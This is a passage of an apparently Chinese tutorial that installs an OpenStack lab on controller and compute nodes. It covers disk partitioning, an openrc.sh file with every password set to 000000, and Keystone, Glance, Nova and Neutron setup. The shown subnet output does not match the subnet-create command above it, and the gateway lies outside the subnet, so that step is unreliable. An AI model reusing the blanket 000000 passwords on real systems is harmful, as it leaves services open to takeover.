prompt_"># </span><span class="language-bash">Serve <span class="keyword">time</span> even <span class="keyword">if</span> not synchronized to a <span class="keyword">time</span> <span class="built_in">source</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">local</span> stratum 10</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify file containing keys <span class="keyword">for</span> NTP authentication.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">keyfile /etc/chrony.keys</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify directory <span class="keyword">for</span> <span class="built_in">log</span> files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Select <span class="built_in">which</span> information is logged.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">log</span> measurements statistics tracking</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##使配置生效</span></span></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl enable chronyd</span><br><span class="line">chronyc sources</span><br></pre></td></tr></table></figure>

<p><strong>⑤在compute节点上查看分区情况，并利用空白分区划分2个20G分区。</strong></p>
<p>compute节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#查看空白分区</span></span></span><br><span class="line">[root@localhost ~]# lsblk</span><br><span class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda               8:0    0   50G  0 disk</span><br><span class="line">├─sda1            8:1    0    1G  0 part /boot</span><br><span class="line">└─sda2            8:2    0   49G  0 part</span><br><span class="line">  ├─centos-root 253:0    0   44G  0 lvm  /</span><br><span class="line">  └─centos-swap 253:1    0    5G  0 lvm  [SWAP]</span><br><span class="line">sdb               8:16   0   40G  0 disk</span><br><span class="line">sr0              11:0    1 1024M  0 rom</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# fdisk /dev/sdb</span><br><span class="line">Welcome to fdisk (util-linux 2.23.2).</span><br><span class="line"></span><br><span class="line">Changes will remain in memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write command.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table</span><br><span class="line">Building a new DOS disklabel with disk identifier 0x4cacbd86.</span><br><span class="line"></span><br><span class="line">Command (m for help): n</span><br><span class="line">Partition type:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p):</span><br><span class="line">Using default response p</span><br><span class="line">Partition number (1-4, default 1):</span><br><span class="line">First sector (2048-83886079, default 2048):</span><br><span class="line">Using default value 2048</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-83886079, default 83886079): +20G</span><br><span class="line">Partition 1 of type Linux and of size 20 GiB is set</span><br><span class="line"></span><br><span class="line">Command (m for help): n</span><br><span class="line">Partition type:</span><br><span class="line">   p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p):</span><br><span class="line">Using default response p</span><br><span class="line">Partition number (2-4, default 2):</span><br><span class="line">First sector (41945088-83886079, default 41945088):</span><br><span class="line">Using default value 41945088</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (41945088-83886079, default 83886079): +20G</span><br><span class="line">Using default value 83886079</span><br><span class="line">Partition 2 of type Linux and of size 20 GiB is set</span><br><span class="line"></span><br><span class="line">Command (m for help): w</span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="任务2-OpenStack平台搭建"><a href="#任务2-OpenStack平台搭建" class="headerlink" title="任务2 OpenStack平台搭建"></a>任务2 OpenStack平台搭建</h2><p><strong>①在 controller 节点和 compute 节点分别安装 iaas-xiandian 软件包，修改脚本文件基本变量（脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh），修改完成后使用命令生效该脚本文件。</strong></p>
<p><strong>②在 compute 节点配置&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh 文件，根据环境情况修改参数，块存储服务的后端使用第二块硬盘的第一个分区，生效该参数文件。</strong></p>
<p><strong>controller节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum install -y iaas-xiandian</span><br><span class="line">[root@localhost ~]# vi /etc/xiandian/openrc.sh</span><br><span class="line">[root@localhost ~]# cat /etc/xiandian/openrc.sh | grep -v ^$ | grep -v ^#</span><br><span class="line">HOST_IP=192.168.157.20</span><br><span class="line">HOST_PASS=000000</span><br><span class="line">HOST_NAME=controller</span><br><span class="line">HOST_IP_NODE=192.168.157.21</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line">network_segment_IP=192.168.157.0/24</span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line">DB_PASS=000000</span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line">NOVA_PASS=000000</span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line">INTERFACE_IP=192.168.157.20</span><br><span class="line">INTERFACE_NAME=ens34</span><br><span class="line">Physical_NAME=provider</span><br><span class="line">minvlan=101</span><br><span class="line">maxvlan=200</span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line">CINDER_PASS=000000</span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.157.21</span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line">HEAT_PASS=000000</span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line">ZUN_PASS=000000</span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line">KURYR_PASS=000000</span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line">AODH_PASS=000000</span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line">BARBICAN_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#将配置文件复制到compute</span></span></span><br><span class="line">[root@localhost ~]# scp /etc/xiandian/openrc.sh root@compute:/etc/xiandian/openrc.sh</span><br><span class="line">The authenticity of host &#x27;compute (192.168.157.21)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:571qhtjNb3asAlUU69GoE8W2Eel7T4VD8/VbitmzBxQ.</span><br><span class="line">ECDSA key fingerprint is MD5:9d:69:e5:7f:58:f8:84:87:9c:d2:1a:39:7b:9f:53:03.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &#x27;compute,192.168.157.21&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">root@compute&#x27;s password:</span><br><span class="line">openrc.sh                                                                                                                  100% 3819     2.5MB/s   00:00</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>compute节点:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat /etc/xiandian/openrc.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------system Config--------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Controller Server Manager IP. example:x.x.x.x</span></span><br><span class="line">HOST_IP=192.168.157.20</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Controller HOST Password. example:000000</span></span><br><span class="line">HOST_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Controller Server hostname. example:controller</span></span><br><span class="line">HOST_NAME=controller</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Compute Node Manager IP. example:x.x.x.x</span></span><br><span class="line">HOST_IP_NODE=192.168.157.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Compute HOST Password. example:000000</span></span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Compute Node hostname. example:compute</span></span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Chrony Config-------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)</span></span><br><span class="line">network_segment_IP=192.168.157.0/24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Rabbit Config ------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">user <span class="keyword">for</span> rabbit. example:openstack</span></span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> rabbit user .example:000000</span></span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------MySQL Config---------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> MySQL root user . exmaple:000000</span></span><br><span class="line">DB_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Keystone Config------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore admin user. exmaple:000000</span></span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql keystore user. exmaple:000000</span></span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Glance Config--------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql glance user. exmaple:000000</span></span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore glance user. exmaple:000000</span></span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Nova Config----------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql nova user. exmaple:000000</span></span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore nova user. exmaple:000000</span></span><br><span class="line">NOVA_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Neturon Config-------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql neutron user. exmaple:000000</span></span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore neutron user. exmaple:000000</span></span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">metadata secret <span class="keyword">for</span> neutron. exmaple:000000</span></span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Tunnel Network Interface. example:x.x.x.x</span></span><br><span class="line">INTERFACE_IP=192.168.157.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">External Network Interface. example:eth1</span></span><br><span class="line">INTERFACE_NAME=ens34</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">External Network The Physical Adapter. example:provider</span></span><br><span class="line">Physical_NAME=provider</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">First Vlan ID <span class="keyword">in</span> VLAN RANGE <span class="keyword">for</span> VLAN Network. exmaple:101</span></span><br><span class="line">minvlan=101</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Last Vlan ID <span class="keyword">in</span> VLAN RANGE <span class="keyword">for</span> VLAN Network. example:200</span></span><br><span class="line">maxvlan=200</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Cinder Config--------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql cinder user. exmaple:000000</span></span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore cinder user. exmaple:000000</span></span><br><span class="line">CINDER_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Cinder Block Disk. example:md126p3</span></span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Swift Config---------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore swift user. exmaple:000000</span></span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">The NODE Object Disk <span class="keyword">for</span> Swift. example:md126p4.</span></span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">The NODE IP <span class="keyword">for</span> Swift Storage Network. example:x.x.x.x.</span></span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.157.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Heat Config----------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql heat user. exmaple:000000</span></span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore heat user. exmaple:000000</span></span><br><span class="line">HEAT_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Zun Config-----------------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql Zun user. exmaple:000000</span></span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore Zun user. exmaple:000000</span></span><br><span class="line">ZUN_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql Kuryr user. exmaple:000000</span></span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore Kuryr user. exmaple:000000</span></span><br><span class="line">KURYR_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Ceilometer Config----------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Gnocchi ceilometer user. exmaple:000000</span></span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore ceilometer user. exmaple:000000</span></span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------AODH Config----------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql AODH user. exmaple:000000</span></span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore AODH user. exmaple:000000</span></span><br><span class="line">AODH_PASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--------------------Barbican Config----------------##</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Mysql Barbican user. exmaple:000000</span></span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Password <span class="keyword">for</span> Keystore Barbican user. exmaple:000000</span></span><br><span class="line">BARBICAN_PASS=000000</span><br><span class="line">[root@localhost ~]# cat /etc/xiandian/openrc.sh | grep -v ^# | grep -v ^$</span><br><span class="line">HOST_IP=192.168.157.20</span><br><span class="line">HOST_PASS=000000</span><br><span class="line">HOST_NAME=controller</span><br><span class="line">HOST_IP_NODE=192.168.157.21</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line">network_segment_IP=192.168.157.0/24</span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line">DB_PASS=000000</span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line">NOVA_PASS=000000</span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line">INTERFACE_IP=192.168.157.21</span><br><span class="line">INTERFACE_NAME=ens34</span><br><span class="line">Physical_NAME=provider</span><br><span class="line">minvlan=101</span><br><span class="line">maxvlan=200</span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line">CINDER_PASS=000000</span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.157.21</span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line">HEAT_PASS=000000</span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line">ZUN_PASS=000000</span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line">KURYR_PASS=000000</span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line">AODH_PASS=000000</span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line">BARBICAN_PASS=000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>③分别在 controller 节点和 compute 节点执行 iaas-pre-host.sh 文件(不需要重启云主机)。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-pre-host.sh</span><br></pre></td></tr></table></figure>

<p><strong>④在 controller 节点执行 iaas-install-mysql.sh 脚本，会自行安装 mariadb、memcached、rabbitmq 等服务和完成相关配置。执行完成后修改配置文件将缓存 CACHESIZE 修改为 128,并重启相应服务。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-mysql.sh</span><br><span class="line">[root@controller ~]# cat /etc/sysconfig/memcached</span><br><span class="line">PORT=&quot;11211&quot;</span><br><span class="line">USER=&quot;memcached&quot;</span><br><span class="line">MAXCONN=&quot;1024&quot;</span><br><span class="line">CACHESIZE=&quot;128&quot;</span><br><span class="line">OPTIONS=&quot;-l 127.0.0.1,::1,controller&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启生效</span></span><br><span class="line">[root@controller ~]# systemctl restart memcached</span><br></pre></td></tr></table></figure>

<p><strong>⑤在 controller 节点执行 iaas-install-keystone.sh 脚本，会自行安装 keystone 服务和完成相关配置。使用 openstack 命令，创建一个名为 tom 的账户，密码为 tompassword123,邮箱为<a href="mailto:tom@example.com">tom@example.com</a></strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-keystone.sh</span><br><span class="line">[root@controller ~]# source /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller ~]# openstack user create tom --password tompassword123 --email tom@example.com --domain demo</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | c7a3303c6f7748f2b22f6421149226b5 |</span><br><span class="line">| email               | tom@example.com                  |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| id                  | 131e1e035c174fd0a10862fe47844cf1 |</span><br><span class="line">| name                | tom                              |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>⑥在 controller 节点执行 iaas-install-glance.sh 脚本，会自行安装 glance 服务和完成相关配 置 。 完 成 后 使 用 openstack 命 令 , 创 建 一 个 名 为 cirros 的 镜 像 ， 镜 像 文 件 使 用cirros-0.3.4-x86_64-disk.img。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##注意请将镜像文件上传</span></span></span><br><span class="line">[root@controller ~]# iaas-install-glance.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack image create --disk-format qcow2 --container bare --file cirros-0.3.4-x86_64-disk.img  cirros</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | 2023-04-17T03:13:42Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | /v2/images/c51eee70-1885-4482-9252-d808c2832cdb/file |</span><br><span class="line">| id               | c51eee70-1885-4482-9252-d808c2832cdb                 |</span><br><span class="line">| min_disk         | 0                                                    |</span><br><span class="line">| min_ram          | 0                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| owner            | 3b0c23a093dd4f11bbd8d7316634b784                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                    |</span><br><span class="line">| size             | 13287936                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | 2023-04-17T03:13:42Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | shared                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>⑦在 controller 节点执行 iaas-install-nova-controller.sh，compute 节点执行iaas-install-nova-compute.sh，会自行安装 nova 服务和完成相关配置。使用 nova 命令创建一个名为 t,ID 为 5，内存为 2048MB,磁盘容量为 10GB,vCPU 数量为 2 的云主机类型。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]#  iaas-install-nova-controller.sh</span><br><span class="line"></span><br><span class="line">[root@compute ~]# iaas-install-nova-compute.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#注意在compute节点跑完之后运行</span></span></span><br><span class="line">[root@controller ~]# nova flavor-create t 5 2048 10 2</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| ID | Name | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| 5  | t    | 2048      | 10   | 0         |      | 2     | 1.0         | True      | -           |</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>⑧在 controller 节点执行 iaas-install-neutron-controller.sh,compute节点执行iaas-install-neutron-compute.sh，会自行安装 neutron 服务并完成配置。创建云主机外部网络 ext-net，子网为 ext-subnet，云主机浮动 IP 可用网段为192.168.10.100 ~ 192. 168.10.200，网关为 192.168.100.1。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-neutron-controller.sh</span><br><span class="line">[root@compute ~]# iaas-install-neutron-compute.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建网络</span></span><br><span class="line">[root@controller ~]# source admin-openrc</span><br><span class="line">[root@controller ~]# openstack network create --external ext-net</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建子网</span></span><br><span class="line">[root@controller ~]# openstack subnet create  --gateway 192.168.100.1 --allocation-pool start=192.168.10.100,end=192.168.10.200 --network ext-net --subnet-range 192.168.10.0/24 ext-subnet</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack subnet show ext-subnet</span><br><span class="line">+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field             | Value                                                                                                                                                   |</span><br><span class="line">+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| allocation_pools  | 192.168.200.100-192.168.200.200                                                                                                                         |</span><br><span class="line">| cidr              | 192.168.200.0/24                                                                                                                                        |</span><br><span class="line">| created_at        | 2023-02-22T16:29:20Z                                                                                                                                    |</span><br><span class="line">| description       |                                                                                                                                                         |</span><br><span class="line">| dns_nameservers   |                                                                                                                                                         |</span><br><span class="line">| enable_dhcp       | True                                                                                                                                                    |</span><br><span class="line">| gateway_ip        | 192.168.200.1                                                                                                                                           |</span><br><span class="line">| host_routes       |                                                                                                                                                         |</span><br><span class="line">| id                | 6ab2ab75-3a82-44d5-9bc8-c2c0a65872d6                                                                                                                    |</span><br><span class="line">| ip_version        | 4                                                                                                                                                       |</span><br><span class="line">| ipv6_address_mode | None                                                                                                                                                    |</span><br><span class="line">| ipv6_ra_mode      | None                                                                                                                                                    |</span><br><span class="line">| location          | cloud=&#x27;&#x27;, project.domain_id=, project.domain_name=&#x27;Default&#x27;, project.id=&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;, project.name=&#x27;admin&#x27;, region_name=&#x27;&#x27;, zone= |</span><br><span class="line">| name              | ext-subnet                                                                                                                                              |</span><br><span class="line">| network_id        | bc39443b-9ef8-4a4d-91b3-fd2637ada43f                                                                                                                    |</span><br><span class="line">| prefix_length     | None                                                                                                                                                    |</span><br><span class="line">| project_id        | ce21284fd468495995218ea6e1aeea2a                                                                                                                        |</span><br><span class="line">| revision_number   | 0                                                                                                                                                       |</span><br><span class="line">| segment_id        | None                                                                                                                                                    |</span><br><span class="line">| service_types     |                                                                                                                                                         |</span><br><span class="line">| subnetpool_id     | None                                                                                                                                                    |</span><br><span class="line">| tags              |                                                                                                                                                         |</span><br><span class="line">| updated_at        | 2023-02-22T16:29:20Z </span><br></pre></td></tr></table></figure>



<p>⑨在 controller 节点执行 iaas-install-dashboard.sh 脚本，会自行安装 dashboard 服务并完成配置。请修改 nova 配置文件，使之能通过公网 IP 访问 dashboard 首页。</p>
